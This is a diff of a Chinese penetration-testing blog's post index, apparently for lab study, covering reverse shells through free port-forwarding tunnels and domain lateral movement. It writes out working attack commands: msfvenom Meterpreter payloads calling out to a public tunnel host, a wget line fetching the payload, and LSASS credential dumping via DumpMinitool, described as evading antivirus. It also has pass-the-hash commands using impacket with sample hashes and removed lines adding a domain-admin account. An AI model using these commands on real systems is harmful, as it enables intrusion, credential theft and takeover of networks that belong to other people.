-<p><a href="https://console.uulap.com/app/login/?next=/">https://console.uulap.com/app/login/?next=/</a></p>
-<p>都是有可以免费使用。</p>
-<p>实验环境：</p>
-<p>kali ：192.168.119.138   （内网）</p>
-<p>对内网主机win/linux，反弹shell。</p>
-<span id="more"></span>
-
-<hr>
-<p>这就涉及目标内网机器是否可以出网。反向连接reverse_tcp/正向连接bind_tcp</p>
-<ul>
-<li><p>reverse_tcp    目标主机可以出网，有些端口没有被拦截（不行换 80 443  8080，一般80端口不会拦截。）</p>
-</li>
-<li><p>bind_tcp          目标主机不可以出网，（开启主机关闭的端口，我们主动去连接）</p>
-<p>参考：</p>
-<p><a href="https://cloud.tencent.com/developer/article/1778292">https://cloud.tencent.com/developer/article/1778292</a></p>
-<p><a href="http://www.voidcn.com/article/p-weuaffcv-bq.html">http://www.voidcn.com/article/p-weuaffcv-bq.html</a></p>
-</li>
-</ul>
-<h2 id="反弹window-shell"><a href="#反弹window-shell" class="headerlink" title="反弹window-shell"></a>反弹window-shell</h2><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>tcp协议</p>
-<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/1.png" alt="1"></p>
-<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/1.1.png" alt="1.1"></p>
-<h4 id="kali-msf"><a href="#kali-msf" class="headerlink" title="kali-msf"></a>kali-msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;s0.z100.vip  LPORT&#x3D;38579 -f exe &gt; zzz.exe           注意这里是公网ip&#x2F;端口        </span><br><span class="line"></span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line"></span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 127.0.0.1       这里一定要是127.0.0.1，192那个不行，可能是端口转发的原因导致</span><br><span class="line"></span><br><span class="line">set lport  8080</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/2.png" alt="2"></p>
-<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/2.1.png" alt="2.1"></p>
-<h4 id="内网win"><a href="#内网win" class="headerlink" title="内网win"></a>内网win</h4><p>运行zzz.exe</p>
-<h2 id="反弹linux-shell"><a href="#反弹linux-shell" class="headerlink" title="反弹linux-shell"></a>反弹linux-shell</h2><h4 id="端口转发-1"><a href="#端口转发-1" class="headerlink" title="端口转发"></a>端口转发</h4><p>和上面一样</p>
-<h4 id="kali-msf-1"><a href="#kali-msf-1" class="headerlink" title="kali-msf"></a>kali-msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">show payloads  选择我们要使用的payload</span><br><span class="line"></span><br><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;s0.z100.vip  LPORT&#x3D;38579 -f elf &gt; zzz.elf           注意这里是公网ip&#x2F;端口        </span><br><span class="line"></span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line"></span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 127.0.0.1       这里一定要是127.0.0.1，192那个不行，可能是端口转发的原因导致</span><br><span class="line"></span><br><span class="line">set lport  8080</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l1.png" alt="l1"></p>
-<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l2.png" alt="l2"></p>
-<h4 id="内网linux"><a href="#内网linux" class="headerlink" title="内网linux"></a>内网linux</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x zzz.elf   给执行权限</span><br><span class="line"></span><br><span class="line">.&#x2F;zzz.elf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l3.png" alt="l3"></p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">实际上我们可以远程下载zzz.elf</span><br><span class="line"></span><br><span class="line">wget  http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:xx&#x2F;zzz.elf</span><br></pre></td></tr></table></figure>
-
-
-
-]]></content>
-      <categories>
-        <category>渗透</category>
-      </categories>
-      <tags>
-        <tag>MSF</tag>
       </tags>
   </entry>
   <entry>
@@ -1226,6 +1230,59 @@
       </tags>
   </entry>
   <entry>
+    <title>msf-端口转发-反弹shell</title>
+    <url>/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/</url>
+    <content><![CDATA[<p>这里借助的是免费的端口转发工具，来进行演示。</p>
+<p><a href="https://www.ngrok.cc/login.html">https://www.ngrok.cc/login.html</a></p>
+<p><a href="https://console.uulap.com/app/login/?next=/">https://console.uulap.com/app/login/?next=/</a></p>
+<p>都是有可以免费使用。</p>
+<p>实验环境：</p>
+<p>kali ：192.168.119.138   （内网）</p>
+<p>对内网主机win/linux，反弹shell。</p>
+<span id="more"></span>
+
+<hr>
+<p>这就涉及目标内网机器是否可以出网。反向连接reverse_tcp/正向连接bind_tcp</p>
+<ul>
+<li><p>reverse_tcp    目标主机可以出网，有些端口没有被拦截（不行换 80 443  8080，一般80端口不会拦截。）</p>
+</li>
+<li><p>bind_tcp          目标主机不可以出网，（开启主机关闭的端口，我们主动去连接）</p>
+<p>参考：</p>
+<p><a href="https://cloud.tencent.com/developer/article/1778292">https://cloud.tencent.com/developer/article/1778292</a></p>
+<p><a href="http://www.voidcn.com/article/p-weuaffcv-bq.html">http://www.voidcn.com/article/p-weuaffcv-bq.html</a></p>
+</li>
+</ul>
+<h2 id="反弹window-shell"><a href="#反弹window-shell" class="headerlink" title="反弹window-shell"></a>反弹window-shell</h2><h4 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h4><p>tcp协议</p>
+<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/1.png" alt="1"></p>
+<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/1.1.png" alt="1.1"></p>
+<h4 id="kali-msf"><a href="#kali-msf" class="headerlink" title="kali-msf"></a>kali-msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">msfvenom -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;s0.z100.vip  LPORT&#x3D;38579 -f exe &gt; zzz.exe           注意这里是公网ip&#x2F;端口        </span><br><span class="line"></span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line"></span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 127.0.0.1       这里一定要是127.0.0.1，192那个不行，可能是端口转发的原因导致</span><br><span class="line"></span><br><span class="line">set lport  8080</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/2.png" alt="2"></p>
+<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/2.1.png" alt="2.1"></p>
+<h4 id="内网win"><a href="#内网win" class="headerlink" title="内网win"></a>内网win</h4><p>运行zzz.exe</p>
+<h2 id="反弹linux-shell"><a href="#反弹linux-shell" class="headerlink" title="反弹linux-shell"></a>反弹linux-shell</h2><h4 id="端口转发-1"><a href="#端口转发-1" class="headerlink" title="端口转发"></a>端口转发</h4><p>和上面一样</p>
+<h4 id="kali-msf-1"><a href="#kali-msf-1" class="headerlink" title="kali-msf"></a>kali-msf</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line"></span><br><span class="line">show payloads  选择我们要使用的payload</span><br><span class="line"></span><br><span class="line">msfvenom -p linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;s0.z100.vip  LPORT&#x3D;38579 -f elf &gt; zzz.elf           注意这里是公网ip&#x2F;端口        </span><br><span class="line"></span><br><span class="line">use exploit&#x2F;multi&#x2F;handler</span><br><span class="line"></span><br><span class="line">set payload linux&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line"></span><br><span class="line">set lhost 127.0.0.1       这里一定要是127.0.0.1，192那个不行，可能是端口转发的原因导致</span><br><span class="line"></span><br><span class="line">set lport  8080</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l1.png" alt="l1"></p>
+<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l2.png" alt="l2"></p>
+<h4 id="内网linux"><a href="#内网linux" class="headerlink" title="内网linux"></a>内网linux</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod +x zzz.elf   给执行权限</span><br><span class="line"></span><br><span class="line">.&#x2F;zzz.elf</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/2021/06/03/msf-%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91-%E5%8F%8D%E5%BC%B9shell/l3.png" alt="l3"></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">实际上我们可以远程下载zzz.elf</span><br><span class="line"></span><br><span class="line">wget  http:&#x2F;&#x2F;xxx.xxx.xxx.xxx:xx&#x2F;zzz.elf</span><br></pre></td></tr></table></figure>
+
+
+
+]]></content>
+      <categories>
+        <category>渗透</category>
+      </categories>
+      <tags>
+        <tag>MSF</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>python-study</title>
     <url>/2021/01/10/python-study/</url>
     <content><![CDATA[<h2 id="0x01-MD5-encrypt-this-string"><a href="#0x01-MD5-encrypt-this-string" class="headerlink" title="0x01 MD5 encrypt this string"></a>0x01 MD5 encrypt this string</h2><p><img src="/2021/01/10/python-study/1.png" alt="image-20210129112157855"></p>
@@ -1256,7 +1313,7 @@
 <p>总结：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;c:\filename&quot;</span>,<span class="string">&quot;mode&quot;</span>)   //mode:r/w/a</span><br><span class="line">xxxxxxx</span><br><span class="line">xxxxxxx</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
 
-<h2 id="0x04awd-sendflag"><a href="#0x04awd-sendflag" class="headerlink" title="0x04awd_sendflag"></a>0x04awd_sendflag</h2><p>学习的大佬脚本，批量sendflag。</p>
+<h2 id="0x04-awd-sendflag"><a href="#0x04-awd-sendflag" class="headerlink" title="0x04 awd_sendflag"></a>0x04 awd_sendflag</h2><p>学习的大佬脚本，批量sendflag。</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">result</span>-<span class="title">flag</span>(<span class="params">flag</span>):</span>      //自定义函数</span><br><span class="line"></span><br><span class="line">    url=<span class="string">&quot;http://xx.xxx.xxx.xx:8080/api/v1/challenges/attempt&quot;</span></span><br><span class="line">    <span class="comment">#data=&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&quot;+flag+&quot;&quot;&#125;</span></span><br><span class="line">    data=<span class="string">&#x27;&#123;&quot;challenge_id&quot;:2,&quot;submission&quot;:&quot;&#x27;</span>+flag+<span class="string">&#x27;&quot;&#125;&#x27;</span></span><br><span class="line">    h = &#123;</span><br><span class="line"><span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;</span>,</span><br><span class="line"><span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>,</span><br><span class="line"><span class="string">&quot;CSRF-Token&quot;</span>:<span class="string">&quot;e9817606c5e5373499bd7e43b64c045b60a276b839b340c4f4a37c2eb27f4e8a&quot;</span>,</span><br><span class="line"><span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;keep-alive&quot;</span>,</span><br><span class="line"><span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">    cookies=&#123;<span class="string">&quot;session&quot;</span>:<span class="string">&quot;2deefa03-cda6-41fc-be25-a986067c7048&quot;</span>,<span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;jnr3quolg5o2ohlifbdld6bku5&quot;</span>&#125;</span><br><span class="line">    req=requests.post(url=url,data=data,cookies=cookies,headers=h)</span><br><span class="line">    <span class="built_in">print</span>(req.text)        //result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flagtxt</span>():</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;web1-flag.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> a <span class="keyword">in</span> f:</span><br><span class="line">            <span class="built_in">print</span>(a.strip())</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line">            result-flag(a.strip())</span><br><span class="line">            </span><br><span class="line">flagtxt()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 
@@ -1268,6 +1325,20 @@
 
 <p>结果如下</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">yes!</span><br><span class="line">[+] 43650254 66666b9c81d0d15f983ad8963908ce10 </span><br><span class="line">完成！</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="0x06-多线程"><a href="#0x06-多线程" class="headerlink" title="0x06 多线程"></a>0x06 多线程</h2><ul>
+<li>1</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>(<span class="params">name</span>):</span></span><br><span class="line">    time.sleep(<span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s say hello&#x27;</span> %name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t=Thread(target=test,args=(<span class="string">&#x27;egon&#x27;</span>,))</span><br><span class="line">    t.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;主线程&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>2</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span>(<span class="params">Thread</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name</span>):</span></span><br><span class="line">        <span class="built_in">super</span>().__init__()</span><br><span class="line">        self.name = name</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s good night&quot;</span> %self.name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    t = test(<span class="string">&#x27;lihua&#x27;</span>)</span><br><span class="line">    t.start()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;zhuxiancheng&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<h2 id="0x07-proxy"><a href="#0x07-proxy" class="headerlink" title="0x07 proxy"></a>0x07 proxy</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;https://home.firefoxchina.cn/&quot;</span></span><br><span class="line">proxies= &#123;<span class="string">&#x27;http&#x27;</span>:<span class="string">&#x27;http://127.0.0.1:8080&#x27;</span>,<span class="string">&#x27;https&#x27;</span>:<span class="string">&#x27;https://127.0.0.1:8080&#x27;</span>&#125;</span><br><span class="line">r=requests.get(url,proxies=proxies,verify=<span class="literal">False</span>)  <span class="comment">###verify 避免证书检测</span></span><br><span class="line"><span class="built_in">print</span>(r.status_code)</span><br></pre></td></tr></table></figure>
 
 ]]></content>
       <categories>
@@ -1511,7 +1582,6 @@
 <li><a href="https://phpinfo.me/domain/">phpinfo</a></li>
 <li><a href="https://www.t1h2ua.cn/tools/">t1h2ua</a></li>
 <li><a href="https://dnsdumpster.com/">dnsdumpster</a></li>
-<li><a href="https://d.chinacycc.com/">chinacycc</a></li>
 <li><a href="http://z.zcjun.com/">zcjun</a></li>
 </ul>
 <p>phpinfo  还行</p>
@@ -1695,6 +1765,10 @@
 
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175201822.png" alt="image-20220303175201822"></p>
 <p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220303175812371.png" alt="image-20220303175812371"></p>
+<p>域信任关系</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nltest &#x2F;domain_trusts   获取域信任信息 </span><br><span class="line">nltest &#x2F;domain_trusts &#x2F;all_trusts &#x2F;v &#x2F;server:192.168.100.236 返回所有信任192.168.100.236域的所有域</span><br><span class="line">nltest &#x2F;dsgetdc:shmily.god 返回信任域相关信息</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/06/17/%E5%86%85%E7%BD%91%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/image-20220414000904861.png" alt="image-20220414000904861"></p>
 <p>参考：</p>
 <p><a href="https://www.t00ls.net/articles-39285.html">内网渗透命令大全</a></p>
 <p><a href="https://jwt1399.top/posts/25535.html#toc-heading-14">Attck1</a></p>
@@ -1724,6 +1798,16 @@
 <p>31D6CFE0D16AE931B73C59D7E0C089C0是<code>NTLM hash</code></p>
 <p>在<code>域环境</code>中，机器认证是利用kerberos协议，在内网渗透中，域环境中拿到普通域用户/域管 hash，可以尝试pth。</p>
 <p>在<code>工作组</code>环境中如果两台机器如果本地administrator账号密码一样也可能可以pth（实验过）。</p>
+<p> 域环境中如果两台机器如果本地administrator账号密码一样也可能可以pth，所以这就体现<code>LAPS</code>方案重要性。</p>
+<p>LAPS：Local Administrator Password Solution是<strong>本地管理员密码</strong>解决方案</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">安装</span><br><span class="line">powershell Get-ADComputer computername -Properties ms-Mcs-AdmPwd | select name, ms-Mcs-AdmPwd</span><br><span class="line"></span><br><span class="line">如果安装可在软件列表中发现 Local Administrator Password Solution</span><br></pre></td></tr></table></figure>
+
+<p>LAPS允许您在<code>加入域</code>的情况下管理<code>本地管理员密码</code>（<code>随机</code>，唯一且定期更改）电脑。如果计算机未加入域，则将无法使用LAPS。这些密码集中存储在Active Directory中，并且仅限使用ACL的授权用户使用。使用Kerberos v5和AES从客户端到服务器的传输密码受到保护。</p>
+<p>这个功能实现的是让加域的客户端本地administrator账号密码随机化（每一台都不一样的复杂随机密码），并且随机化密码存储在AD上可以查询到，避免***者猜出一台就等于猜出一片，从客户端到服务器的传输过程采用Kerberos v5和AES保护</p>
+<h1 id="LSASS"><a href="#LSASS" class="headerlink" title="LSASS"></a>LSASS</h1><p>lsass进程内存中存储大量敏感信息</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">encrypted passwords</span><br><span class="line">NT hashes</span><br><span class="line">LM hashes</span><br><span class="line">Kerberos tickets</span><br></pre></td></tr></table></figure>
+
+<p>通过LSASS转储来进行权限提升，数据窃取和横向移动等。</p>
 <h1 id="1-mimikatz"><a href="#1-mimikatz" class="headerlink" title="1. mimikatz"></a>1. mimikatz</h1><p>需要<code>管理员权限</code></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot; &gt; log.txt </span><br></pre></td></tr></table></figure>
 
@@ -1773,6 +1857,20 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Sqldumper.exe &lt;ProcessID&gt; 0 0x01100    完整转储</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2022/03/25/%E5%86%85%E7%BD%91%E6%8A%93hash/image-20220330155608001.png" alt="image-20220330155608001"></p>
+<h3 id="DumpMinitool-exe"><a href="#DumpMinitool-exe" class="headerlink" title="DumpMinitool.exe"></a>DumpMinitool.exe</h3><ul>
+<li>过360，wdf  ，自带微软签名</li>
+</ul>
+<p>参考：<a href="https://twitter.com/mrd0x/status/1511415432888131586/photo/1">https://twitter.com/mrd0x/status/1511415432888131586/photo/1</a></p>
+<p>有写winserver不带这个程序，这点比较限制</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C：\Program Files\Microsoft Visual Studio\2022\Community\Common7\IDE\Extensions\TestPlatform\Extensions</span><br></pre></td></tr></table></figure>
+
+<p>DumpMinitool.exe   </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DumpMinitool.exe   --file  c:\dump.txt  --proccessId xxxx --dumpType Full</span><br></pre></td></tr></table></figure>
+
+
+
+
+
 <h1 id="3-Out-MiniDump"><a href="#3-Out-MiniDump" class="headerlink" title="3. Out-MiniDump"></a>3. Out-MiniDump</h1><p>Out-MiniDump.ps1 wdf直接杀，环境win10下Import-Module 不能执行，可能win server能用吧</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module Out-MiniDump  </span><br><span class="line"></span><br><span class="line">Get-Process lsass | Out-Minidump   </span><br></pre></td></tr></table></figure>
 
@@ -1787,6 +1885,7 @@
 <p>方法还有更多，杀软也多种多样，慢慢学习吧</p>
 <p>参考：</p>
 <p>一些获取Windows明文凭据的方法 | Loong716]：<a href="https://loong716.top/posts/lsass/">https://loong716.top/posts/lsass/</a></p>
+<p><a href="https://redcanary.com/threat-detection-report/techniques/lsass-memory/">LSASS 内存 - 威胁检测报告 - 红色金丝雀 (redcanary.com)</a></p>
 <h1 id="tips"><a href="#tips" class="headerlink" title="tips:"></a>tips:</h1><ol>
 <li>winserver2012以后只能抓到用户hash，抓不到明文，但可以通过修改注册表**<code>开启Wdigest Auth</code>**，</li>
 </ol>
@@ -1829,11 +1928,30 @@
 
 
 <h3 id="psexec-ipc"><a href="#psexec-ipc" class="headerlink" title="psexec+ipc$"></a>psexec+ipc$</h3><p>前提是与目标主机建立ipc连接</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br><span class="line"></span><br><span class="line">net group &#x2F;domain</span><br><span class="line"></span><br><span class="line">net user hack 123qwe... &#x2F;add &#x2F;domain   #创建普通域用户</span><br><span class="line"></span><br><span class="line">net group &quot;Domain Admins&quot; hack &#x2F;add &#x2F;domain   #将普通域用户 提升为域管理</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">net use \\192.168.3.100\ipc$   建立ipc共享</span><br><span class="line"></span><br><span class="line">PsExec64.exe -accepteula \\&lt;目标机IP&gt; -s cmd.exe   #获得交互式shell，并且权限提升到system权限</span><br></pre></td></tr></table></figure>
 
 
 
-<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><p>通常用来域内权限维持</p>
+<h3 id="ipc-at"><a href="#ipc-at" class="headerlink" title="ipc+at"></a>ipc+at</h3><h3 id="ipc-schtasks"><a href="#ipc-schtasks" class="headerlink" title="ipc+schtasks"></a>ipc+schtasks</h3><h1 id="WMI"><a href="#WMI" class="headerlink" title="WMI"></a>WMI</h1><ul>
+<li>开放135</li>
+</ul>
+<h1 id="winrm服务"><a href="#winrm服务" class="headerlink" title="winrm服务"></a>winrm服务</h1><h1 id="dcom"><a href="#dcom" class="headerlink" title="dcom"></a>dcom</h1><h1 id="windows服务"><a href="#windows服务" class="headerlink" title="windows服务"></a>windows服务</h1><h1 id="PTH"><a href="#PTH" class="headerlink" title="PTH"></a>PTH</h1><p>基于NTML hash认证  (windows认证方式)</p>
+<ul>
+<li>impacket</li>
+</ul>
+<p>atexec.py  直接hash传递进行命令执行，并提权system  （需要免杀）</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 atexec.py -hashes :3c3ec769143bdd0ed99861d0fb79fc6b shmily.god&#x2F;Administrator@192.168.119.100 &quot;whoami&quot;</span><br><span class="line"></span><br><span class="line">python3 atexec.py .&#x2F;administrator:admin123...@192.168.119.100 &quot;whoami&quot;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>psexec.py </p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:cd243e1e171da2c4edd1dd695bfbef5a shmily.god&#x2F;Administrator@192.168.119.100</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">python3 psexec.py shmily.god&#x2F;administrator:admin123...\!@192.168.119.100</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h1 id="PTT"><a href="#PTT" class="headerlink" title="PTT"></a>PTT</h1><p>通常用来域内<code>权限维持</code></p>
 <h3 id="Golden-Ticket"><a href="#Golden-Ticket" class="headerlink" title="Golden Ticket"></a>Golden Ticket</h3><p><img src="/2021/06/21/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F/image-20220307225058167.png" alt="image-20220307225058167"></p>
 <p>krbtgt 是kdc服务使用账户，在Domain Admins组中，域环境中，用户账户的票据都是krbtgt生成的。</p>
 <p>如果攻击者拿到了 krbtgt的ntml hash或者AES-256值，<code>即可伪造任意用户身份</code></p>
